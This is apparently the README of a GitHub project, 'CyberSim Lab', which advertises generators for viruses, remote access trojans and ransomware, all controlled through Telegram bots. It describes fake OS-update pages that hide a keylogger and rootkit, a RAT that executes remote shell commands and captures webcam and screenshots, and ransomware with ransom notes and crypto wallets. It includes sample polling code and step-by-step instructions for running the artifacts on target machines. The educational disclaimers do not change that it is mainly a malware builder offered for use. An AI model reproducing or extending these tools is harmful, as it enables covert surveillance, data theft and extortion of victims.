<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0f0f23&height=180&section=header&text=CyberSim%20Lab&fontSize=42&fontColor=00ff41&animation=fadeIn&fontAlignY=35&desc=Advanced%20Cybersecurity%20Research%20Dashboard&descSize=18&descColor=00cc33"/>

<p align="center">
  <a href="https://python.org"><img src="https://img.shields.io/badge/Python-3.12+-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python"/></a>
  <a href="https://flask.palletsprojects.com"><img src="https://img.shields.io/badge/Flask-3.x-000000?style=flat-square&logo=flask&logoColor=white" alt="Flask"/></a>
  <a href="https://telegram.org"><img src="https://img.shields.io/badge/C2-Telegram%20Bot-26A5E4?style=flat-square&logo=telegram&logoColor=white" alt="Telegram"/></a>
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D4?style=flat-square&logo=linux&logoColor=white" alt="Platform"/>
  <img src="https://img.shields.io/badge/License-Educational-red?style=flat-square" alt="License"/>
  <img src="https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square" alt="Status"/>
</p>

<p align="center">
  <b>Virus Generator</b>
  <span>&nbsp;·&nbsp;</span>
  <b>RAT Generator</b>
  <span>&nbsp;·&nbsp;</span>
  <b>Ransomware Generator</b>
</p>

<p align="center">
  <i>An open-source cybersecurity research tool for creating and studying malware behavior in a safe, controlled environment.</i>
</p>

<img src="https://img.shields.io/badge/EDUCATIONAL_PURPOSE_ONLY-red?style=for-the-badge&label=Warning&labelColor=000" alt="Educational Purpose"/>

<br/>
<br/>

<a href="#-overview">Overview</a> ·
<a href="#-key-features">Features</a> ·
<a href="#-installation">Installation</a> ·
<a href="#-usage-guide">Usage</a> ·
<a href="#-architecture">Architecture</a> ·
<a href="#-license">License</a>

<br/>

<img src="https://komarev.com/ghpvc/?username=iAryanbajaj&repo=CyberSim-Lab&style=flat-square&color=00ff41" alt="Profile Views"/>

</div>

---

## 📋 Overview

> **"To defeat your enemy, you must understand their weapons."**

**CyberSim Lab** is a comprehensive, Flask-based cybersecurity research platform designed for ethical hacking research, academic study, and penetration testing training. It provides **three powerful tools** that replicate real-world malware behaviors — viruses, remote access trojans (RATs), and ransomware — within a completely safe and controlled environment.

The platform runs on **Kali Linux** as the primary development environment and generates malware artifacts targeting **Windows**, **macOS**, and **Linux** systems. All three tools use **Telegram Bot API** as the Command & Control (C2) server, enabling researchers to study full attack chains, communication protocols, and system-level interactions in real time.

Whether you're a cybersecurity student learning about malware for the first time, a researcher studying attack patterns, or a penetration tester demonstrating threats to clients — CyberSim Lab provides the tools you need.

---

## ✨ Key Features

<table>
<tr>
<td width="33%">

### 🦠 Virus Generator

**Realistic malware binary generation** with social engineering deception

- Cross-platform binaries (Windows `.exe`, macOS/Linux `.sh`)
- **Fake System Update website** opens in browser (OS-specific branding)
- 10-step animated progress bar
- Rootkit · Keylogger · Process Injection · Stealth
- Telegram C2 alerts for each phase
- Multi-threaded execution

</td>
<td width="33%">

### 🖥️ RAT Generator

**Full remote access trojan** with real-time Telegram control

- System info · File browser · Screenshots
- Webcam capture · Keylogger · Shell access
- Process manager · Network scan
- Interactive Telegram bot commands
- OS-specific templates (Win/Mac/Linux)
- Persistent polling connection

</td>
<td width="33%">

### 🔐 Ransomware Generator

**Complete ransomware attack chain** with decryption

- AES-256 encryption engine
- Configurable target extensions
- Custom ransom note + wallet
- Telegram C2 key reporting
- Built-in decryption capability
- Step-by-step attack walkthrough

</td>
</tr>
</table>

---

## 🔬 Deep Dive: Features Explained

### 1. Virus Generator — Deception at Its Finest

The Virus Generator engine creates highly realistic malware binaries that employ **social engineering** through a fake "System Update" website. When the binary executes on a target system, two parallel threads launch simultaneously:

**Thread 1 — Fake Website Server:**
- Starts a local HTTP server on a random port
- Opens the default browser to display a convincing OS-specific update page
- Windows shows "Windows Security Update" with Microsoft branding
- macOS shows "macOS System Update" with Apple branding
- Linux shows "System Package Update" with neutral branding
- Features a 10-step animated progress bar with realistic status messages

**Thread 2 — Virus Engine:**
- Collects comprehensive system information (hostname, OS, IP, CPU, RAM, disk)
- Rootkit behavior (process hiding, registry manipulation)
- Keylogger behavior (keystroke logging)
- Process injection techniques
- Sends all data to the attacker via Telegram Bot C2

The HTML for the fake website is **Base64-encoded** within the template engine, completely avoiding f-string escaping issues while keeping the generated binary clean and portable.

<details>
<summary>📁 Example: Generated Virus Binary Structure</summary>

```python
# Pseudo-structure of generated virus binary
class VirusEngine:
    def __init__(self, config):
        self.config = config          # Name, spread_rate, payload, etc.
        self.telegram_bot = TelegramC2(config.bot_token, config.chat_id)
    
    def run(self):
        # Start fake website in background thread
        Thread(target=self.start_fake_update_page).start()
        
        # Run virus engine in main thread
        self.collect_system_info()    # Hostname, OS, IP, hardware
        self.run_rootkit()            # Process hiding, persistence
        self.run_keylogger()          # Keystroke capture
        self.run_spread()             # Network propagation
        self.report_to_c2()           # Send everything to Telegram
    
    def start_fake_update_page(self):
        # Serve fake OS-specific update page
        # Windows → "Installing Security Update KB5034441..."
        # macOS   → "Installing macOS Sonoma 14.3.1 Update..."
        # Linux   → "Installing System Packages..."
        serve_fake_html(title, icon, brand)
```

</details>

### 2. RAT Generator — Complete Remote Control

The RAT Generator creates cross-platform remote access trojans with a rich command set controlled entirely through **Telegram Bot commands**. Each OS has a dedicated template optimized for platform-specific APIs.

<details>
<summary>⚙️ Available Telegram Bot Commands</summary>

```
┌──────────────────┬──────────────────────────────────────┐
│ Command          │ Description                          │
├──────────────────┼──────────────────────────────────────┤
│ /info            │ Full system information dump          │
│ /shell <cmd>     │ Execute any system command            │
│ /screenshot      │ Capture and send screen screenshot    │
│ /webcam          │ Capture webcam photo                  │
│ /files [path]    │ Browse files at given path            │
│ /download <file> │ Download file from target             │
│ /upload <file>   │ Upload file to target                 │
│ /processes       │ List all running processes            │
│ /kill <pid>      │ Kill a process by PID                 │
│ /keylogger       │ Toggle keystroke logging on/off       │
│ /sysinfo         │ Quick system summary                  │
│ /network         │ Network interfaces & connections      │
│ /help            │ Show all available commands           │
└──────────────────┴──────────────────────────────────────┘
```

</details>

The RAT uses a **persistent polling mechanism** — it continuously checks for new commands from the Telegram Bot API, executes them, and sends results back. This eliminates the need for port forwarding or complex network setup.

<details>
<summary>📁 Example: RAT Connection Flow</summary>

```python
# Simplified RAT polling mechanism
import telebot

bot = telebot.TeleBot(BOT_TOKEN)

def command_loop():
    while True:
        try:
            updates = bot.get_updates()
            for update in updates:
                if update.message.text.startswith('/'):
                    execute_command(update.message)
                    bot.reply_to(update.message, result)
        except Exception as e:
            send_telegram(f"Error: {e}")
        sleep(3)  # Poll every 3 seconds

def execute_command(message):
    cmd = message.text.split()
    if cmd[0] == '/shell':
        result = subprocess.run(cmd[1:], capture_output=True)
        send_telegram(result.stdout.decode())
    elif cmd[0] == '/screenshot':
        capture = take_screenshot()
        bot.send_photo(CHAT_ID, capture)
    # ... more commands
```

</details>

### 3. Ransomware Generator — Full Attack Chain

The Ransomware Generator walks through the **complete ransomware attack lifecycle**, from initial encryption to ransom demand, with safe decryption capability for recovery.

<details>
<summary>📜 Ransomware Attack Chain</summary>

```
Phase 1: RECONNAISSANCE
    └── Scan filesystem for target file extensions
    └── Count files to be encrypted
    └── Report victim info to Telegram C2

Phase 2: KEY GENERATION
    └── Generate AES-256 encryption key
    └── Send encryption key to attacker via Telegram
    └── Store key locally for decryption option

Phase 3: ENCRYPTION
    └── Iterate through target directories
    └── Encrypt matching files → rename to .locked
    └── Skip critical system files (safety)

Phase 4: RANSOM DEMAND
    └── Generate ransom note on desktop
    └── Display custom message with crypto wallet
    └── Show encrypted file count

Phase 5: REPORTING
    └── Send summary to Telegram:
        • Victim hostname & OS
        • Total files encrypted
        • Encryption method used
        • Original encryption key
```

</details>

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│                    CyberSim Lab Dashboard                           │
│                     Flask Web Server :5001                          │
│                     Kali Linux (Host)                               │
│                                                                     │
│  ┌─────────────────┐ ┌─────────────────┐ ┌──────────────────────┐  │
│  │                 │ │                 │ │                      │  │
│  │  🦠 Virus       │ │  🖥️ RAT         │ │  🔐 Ransomware       │  │
│  │  Generator      │ │  Generator      │ │  Generator           │  │
│  │  Engine         │ │  Engine         │ │  Engine              │  │
│  │                 │ │                 │ │                      │  │
│  │  • Fake Site    │ │  • OS Templates │ │  • Encrypt/Decrypt   │  │
│  │  • Rootkit  │ │  • Keylogger    │ │  • Ransom Note       │  │
│  │  • Keylogger   │ │  • Screenshot   │ │  • Key Reporting     │  │
│  │  • Process Inj.   │ │  • Webcam       │ │                      │  │
│  │  • Telegram C2  │ │  • Shell        │ │                      │  │
│  │                 │ │  • Telegram C2  │ │                      │  │
│  └────────┬────────┘ └────────┬────────┘ └──────────┬───────────┘  │
│           │                   │                     │              │
│           ▼                   ▼                     ▼              │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │                 Template Engine (f-string + Base64)          │   │
│  │    ransomware_template.py │ rat_linux_template.py │          │   │
│  │    rat_macos_template.py  │ rat_telegram_win.py   │          │   │
│  └──────────────────────────────────────────────────────────────┘   │
│           │                   │                     │              │
│           ▼                   ▼                     ▼              │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │              Generated Artifacts (Downloads)                  │   │
│  │    .exe (Windows)  │  .sh (macOS/Linux)  │  .py scripts      │   │
│  └──────────────────────────────────────────────────────────────┘   │
│                                                                     │
└───────────────────────────────┬─────────────────────────────────────┘
                                │
                                │ HTTPS
                                │
                                ▼
                 ┌──────────────────────────┐
                 │   Telegram Bot API (C2)  │
                 │                          │
                 │  • System Info           │
                 │  • Command Execution     │
                 │  • File Transfers        │
                 │  • Alerts & Reports      │
                 │  • Encryption Keys       │
                 └────────────┬─────────────┘
                              │
                              ▼
                 ┌──────────────────────────┐
                 │    Attacker's Telegram   │
                 │    (Mobile / Desktop)    │
                 └──────────────────────────┘
```

---

## 💻 Tech Stack

| Layer | Technology | Purpose |
|:-----:|:----------:|---------|
| **Backend** | ![Python](https://img.shields.io/badge/Python-3.12+-3776AB?style=flat-square&logo=python) | Core application logic |
| **Framework** | ![Flask](https://img.shields.io/badge/Flask-3.x-000000?style=flat-square&logo=flask) | Web dashboard server |
| **C2 Server** | ![Telegram](https://img.shields.io/badge/Telegram-Bot_API-26A5E4?style=flat-square&logo=telegram) | Command & Control communication |
| **Frontend** | ![HTML/CSS/JS](https://img.shields.io/badge/HTML_CSS_JS-Inline-E34F26?style=flat-square&logo=html5) | Dashboard UI (inline in Flask) |
| **Packaging** | ![PyInstaller](https://img.shields.io/badge/PyInstaller-EXE-green?style=flat-square) | Windows binary compilation |
| **Input Capture** | ![pynput](https://img.shields.io/badge/pynput-v1.6-9B59B6?style=flat-square) | Keyboard & mouse monitoring |
| **Screenshots** | ![Pillow](https://img.shields.io/badge/Pillow-PIL-1ABC9C?style=flat-square) | Screen & webcam capture |
| **Encoding** | ![Base64](https://img.shields.io/badge/base64-Template-yellow?style=flat-square) | HTML template encoding |

---

## 📦 Installation

### Prerequisites

- **Python 3.12 or higher** installed
- **Telegram Bot Token** — Create one via [@BotFather](https://t.me/BotFather)
- **Your Telegram Chat ID** — Get it from [@userinfobot](https://t.me/userinfobot)
- **Kali Linux** (recommended) or any modern Linux distribution

### Quick Start

```bash
# 1. Clone the repository
git clone https://github.com/iAryanbajaj/CyberSim-Lab.git
cd CyberSim-Lab

# 2. Create virtual environment
python3 -m venv venv
source venv/bin/activate

# 3. Install dependencies
pip install -r requirements.txt

# 4. Launch the dashboard
python app.py
```

> 🌐 Open **http://localhost:5001** in your browser — you're ready to go!

### Dependencies

```
flask>=3.0
requests>=2.31
pyTelegramBotAPI>=4.14
pynput>=1.6.8
Pillow>=10.0
pyinstaller>=6.0
```

---

## 📖 Usage Guide

### Dashboard Overview

After launching `python app.py`, the dashboard opens at `http://localhost:5001` with three main tabs:

```
 ┌──────────────────────────────────────────────────────────┐
 │  🛡️ CyberSim Lab                                        │
 │  ┌──────────────┬──────────────────┬──────────────────┐  │
 │  │ 🦠 Virus Gen │ 🖥️ RAT Generator│ 🔐 Ransomware    │  │
 │  └──────────────┴──────────────────┴──────────────────┘  │
 │                                                          │
 │  [ Configure Parameters ]                                │
 │  [ Telegram Bot Token ]                                  │
 │  [ Generate & Download ]                                 │
 └──────────────────────────────────────────────────────────┘
```

### Virus Genulation — Step by Step

```bash
# Step 1: Open the Virus Genulation tab

# Step 2: Configure parameters
#   • Virus Name: "SystemOptimizer"
#   • Spread Rate: Medium
#   • Payload Type: Keylogger
#   • Persistence: High
#   • Target OS: Windows

# Step 3: Enter Telegram credentials
#   • Bot Token: "123456:ABC-DEF..."
#   • Chat ID: "987654321"

# Step 4: Click "Generate & Download"
#   → Downloads: SystemOptimizer_win.exe (or .sh for Mac/Linux)

# Step 5: Run on target machine
#   → Browser opens fake "Windows Security Update" page
#   → Background: System info collected, Telegram alerts sent

# Step 6: Monitor in Telegram
#   ✓ System Info: hostname, OS, IP, CPU, RAM
#   ✓ Rootkit: Persistence installed
#   ✓ Keylogger: Keystroke capture started
#   ✓ Spread: Network propagation executed
```

### RAT Generator — Step by Step

```bash
# Step 1: Open the RAT Generator tab

# Step 2: Configure
#   • Target OS: Windows / macOS / Linux
#   • RAT Name: "RemoteHelper"

# Step 3: Enter Telegram credentials

# Step 4: Click "Generate RAT"
#   → Downloads OS-specific binary

# Step 5: Run on target machine
#   → RAT connects to Telegram Bot automatically

# Step 6: Control via Telegram commands
#   /info          → Full system info
#   /shell whoami  → Execute commands
#   /screenshot    → Capture screen
#   /webcam        → Webcam photo
#   /files C:\     → Browse files
#   /processes     → List processes
#   /keylogger     → Start keystroke logging
```

### Ransomware Generator — Step by Step

```bash
# Step 1: Open the Ransomware Generator tab

# Step 2: Configure
#   • Target Extensions: .txt, .docx, .pdf, .jpg, .png
#   • Encryption Method: AES-256
#   • Ransom Amount: "0.5 BTC"
#   • Wallet: "bc1qxy2kgdygjrsqtzq2n0yrf..."
#   • Custom Message: "Your files have been encrypted..."

# Step 3: Enter Telegram credentials

# Step 4: Click "Generate Ransomware"
#   → Downloads ransomware script

# Step 5: Run on target (EDUCATIONAL USE ONLY!)
#   → Files encrypted → .locked extension added
#   → Ransom note appears on desktop
#   → Telegram receives: key, file count, victim info

# Step 6: Decrypt using Telegram-reported key
#   → All files restored safely
```

---

## 📡 Telegram C2 Setup

```
┌──────────────┐                    ┌──────────────────┐
│              │    HTTPS API       │                  │
│   Target     │◄──────────────────►│  Telegram Bot    │
│   Machine    │                    │  API Server      │
│  (Binary)    │  sendUpdates()     │                  │
│              │  getUpdates()      │                  │
└──────────────┘                    └────────┬─────────┘
                                             │
                                             │ Real-time
                                             │ Messages
                                             ▼
                                   ┌──────────────────┐
                                   │   Attacker's     │
                                   │   Telegram App   │
                                   │                  │
                                   │  /shell ls -la   │
                                   │  /screenshot     │
                                   │  /info           │
                                   └──────────────────┘
```

### Creating Your Telegram Bot

1. Open Telegram, search for **[@BotFather](https://t.me/BotFather)**
2. Send `/newbot` command
3. Follow the prompts — choose a name and username
4. **Copy the Bot Token** (looks like `123456789:ABCdefGHI...`)
5. Message **[@userinfobot](https://t.me/userinfobot)** — it will reply with your **Chat ID**
6. Enter both in the CyberSim Lab dashboard

> 💡 **Tip:** Keep your Bot Token private. Never share it publicly or commit it to GitHub.

---

## 📁 Project Structure

```
cybersim-lab/
│
├── 📄 app.py                            ⭐ Main Flask dashboard (all 3 tabs, 1500+ lines)
├── 📄 build_exe_engine.py               🔧 PyInstaller EXE compilation engine
├── 📄 rat_telegram_win.py               🖥️ Standalone Windows RAT (Telegram)
├── 📄 generate_report.js                📊 Report generation utility
├── 📄 requirements.txt                  📦 Python dependencies
├── 📄 README.md                         📖 This file
├── 📄 LICENSE                           ⚖️ Educational License
│
└── 📂 templates/
    ├── 📄 ransomware_template.py        🔐 Ransomware generator template
    ├── 📄 rat_linux_template.py         🐧 RAT Linux template
    └── 📄 rat_macos_template.py         🍎 RAT macOS template
```

| File | Approx. Lines | Description |
|:-----|:------------:|:------------|
| `app.py` | 1500+ | Main Flask application with inline HTML/CSS/JS, all 3 tool tabs |
| `build_exe_engine.py` | 300+ | PyInstaller-based Windows EXE builder |
| `rat_telegram_win.py` | 500+ | Standalone Windows RAT with Telegram C2 |
| `templates/ransomware_template.py` | 200+ | Ransomware script generator |
| `templates/rat_linux_template.py` | 250+ | Linux RAT binary generator |
| `templates/rat_macos_template.py` | 250+ | macOS RAT binary generator |

---

## 📸 Screenshots

> **Note:** Screenshots coming soon! The project is actively being documented.

| Dashboard | Virus Genulation | Fake Update Page |
|:---------:|:---------------:|:----------------:|
| ![Dashboard](https://via.placeholder.com/400x250/0f0f23/00ff41?text=Dashboard) | ![Virus](https://via.placeholder.com/400x250/0f0f23/ff6b6b?text=Virus+Generator) | ![Fake Update](https://via.placeholder.com/400x250/0f0f23/4ecdc4?text=Fake+Update) |

| RAT Generator | Ransomware Generator | Telegram C2 |
|:------------:|:-------------------:|:-----------:|
| ![RAT](https://via.placeholder.com/400x250/0f0f23/45b7d1?text=RAT+Generator) | ![Ransomware](https://via.placeholder.com/400x250/0f0f23/f9ca24?text=Ransomware) | ![Telegram](https://via.placeholder.com/400x250/0f0f23/26A5E4?text=Telegram+C2) |

---

## 🛡️ Security & Ethics

<div align="center">

<img src="https://img.shields.io/badge/READ_BEFORE_USING-red?style=for-the-badge&label=Important" alt="Important"/>

</div>

### ✅ Acceptable Use

- Learning and understanding malware behavior in lab environments
- Academic cybersecurity research and thesis projects
- Authorized penetration testing with **written permission**
- CTF competitions and security training workshops
- Building defensive tools and detection signatures
- Classroom demonstrations for cybersecurity courses

### ❌ Prohibited Use

- Any form of unauthorized system access
- Deploying generated binaries without explicit consent
- Stealing personal data, credentials, or financial information
- Disrupting or damaging any computer system or network
- Any activity violating local, state, national, or international law
- Distributing tools for malicious purposes

### ⚖️ User Responsibility

> **The ENTIRE responsibility of using this software lies SOLELY with the user.**
>
> If any person uses this software for illegal, unauthorized, or harmful activities, that person shall be **SOLELY responsible** for all legal, civil, and criminal consequences. The original developer **SHALL NOT** be held liable for ANY misuse, damage, loss, or legal action arising from the use of this software.

See the full [LICENSE](LICENSE) file for complete terms and conditions.

---

## 🤝 Contributing

We welcome contributions from the cybersecurity community! Here's how you can help:

### Getting Started

```bash
# 1. Fork the repository
# 2. Clone your fork
git clone https://github.com/YOUR_USERNAME/CyberSim-Lab.git
cd CyberSim-Lab

# 3. Create a feature branch
git checkout -b feature/your-feature-name

# 4. Make your changes and commit
git commit -m "Add your feature description"

# 5. Push to your fork
git push origin feature/your-feature-name

# 6. Open a Pull Request
```

### Contribution Guidelines

- ✅ Follow the existing code style and structure
- ✅ Add comments explaining complex logic
- ✅ Test on all 3 target platforms (Windows, macOS, Linux)
- ✅ Update documentation for any new features
- ✅ Add unit tests where applicable
- ❌ **Never add actual malicious capabilities** — educational use only!

---

## 📜 License

This project is licensed under the **Educational Cybersecurity Research License**.

```
Copyright (c) 2025 Aryan Bajaj

This software is created STRICTLY for educational, academic research,
and authorized cybersecurity testing purposes only.

The ENTIRE responsibility of using this software lies SOLELY with the user.
The developer SHALL NOT be held liable for ANY misuse or damage.

See the full LICENSE file for complete terms.
```

See the [LICENSE](LICENSE) file for the full text.

---

## 🙏 Acknowledgments

- **Kali Linux** — Primary development environment
- **Telegram Bot API** — C2 communication platform
- **Python Community** — Excellent libraries and documentation
- **Cybersecurity Researchers** — For inspiration and knowledge sharing

---

## 📬 Contact

- **GitHub:** [iAryanbajaj](https://github.com/iAryanbajaj)
- **Repository:** [CyberSim-Lab](https://github.com/iAryanbajaj/CyberSim-Lab)

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0f0f23&height=100&section=footer"/>

Made with 🔥 by **[Aryan Bajaj](https://github.com/iAryanbajaj)**

If you found this project useful, please consider giving it a ⭐!

[⭐ Star this repo](https://github.com/iAryanbajaj/CyberSim-Lab) ·
[🐛 Report Bug](https://github.com/iAryanbajaj/CyberSim-Lab/issues) ·
[💡 Request Feature](https://github.com/iAryanbajaj/CyberSim-Lab/issues)

</div>
